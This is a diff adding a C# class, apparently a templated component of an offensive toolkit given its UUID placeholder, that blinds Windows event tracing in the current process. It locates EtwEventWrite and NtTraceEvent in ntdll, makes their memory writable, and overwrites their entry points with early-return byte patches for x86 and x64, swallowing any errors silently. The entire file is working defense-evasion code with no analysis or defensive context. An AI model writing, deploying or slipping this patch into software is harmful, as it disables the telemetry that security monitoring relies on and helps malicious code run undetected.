@@ -1,0 +1,97 @@
+public static class ETWPatcher####UUID####
+{
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport("kernel32.dll")]
+    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32.dll")]
+    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr GetCurrentProcess();
+
+    private static readonly UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+    public static void PatchETW()
+    {
+        try
+        {
+            // Get handle to ntdll.dll
+            IntPtr ntdllHandle = GetModuleHandle("ntdll.dll");
+            if (ntdllHandle == IntPtr.Zero)
+            {
+                return;
+            }
+
+            // Determine if we're running in a 32-bit or 64-bit process
+            bool is64Bit = IntPtr.Size == 8;
+            
+            // Choose the appropriate patch based on architecture
+            byte[] patch;
+            if (is64Bit)
+            {
+                // x64 patch: xor rax, rax; ret
+                patch = new byte[] { 0x48, 0x33, 0xc0, 0xc3 };
+                
+                // Get address of EtwEventWrite function
+                IntPtr etwEventWriteAddr = GetProcAddress(ntdllHandle, "EtwEventWrite");
+                if (etwEventWriteAddr == IntPtr.Zero)
+                {
+                    return;
+                }
+                
+                PatchFunction(etwEventWriteAddr, patch);
+            }
+            else
+            {
+                // x86 patch: ret 14
+                patch = new byte[] { 0xc2, 0x14, 0x00 };
+                
+                // Get address of EtwEventWrite function
+                IntPtr etwEventWriteAddr = GetProcAddress(ntdllHandle, "EtwEventWrite");
+                if (etwEventWriteAddr == IntPtr.Zero)
+                {
+                    return;
+                }
+                
+                PatchFunction(etwEventWriteAddr, patch);
+            }
+            
+            // Also patch NtTraceEvent for additional ETW blocking
+            IntPtr ntTraceEventAddr = GetProcAddress(ntdllHandle, "NtTraceEvent");
+            if (ntTraceEventAddr != IntPtr.Zero)
+            {
+                // Simple ret patch (works for both x86 and x64)
+                PatchFunction(ntTraceEventAddr, new byte[] { 0xc3 });
+            }
+        }
+        catch
+        {
+            // Silently fail if anything goes wrong
+        }
+    }
+    
+    private static void PatchFunction(IntPtr functionAddress, byte[] patch)
+    {
+        // Change memory protection to allow writing
+        uint oldProtect;
+        if (!VirtualProtect(functionAddress, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
+        {
+            return;
+        }
+
+        // Write the patch
+        Marshal.Copy(patch, 0, functionAddress, patch.Length);
+
+        // Restore original memory protection
+        VirtualProtect(functionAddress, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+        
+        // Flush instruction cache to ensure the CPU executes our modified code
+        FlushInstructionCache(GetCurrentProcess(), functionAddress, (UIntPtr)patch.Length);
+    }
+}
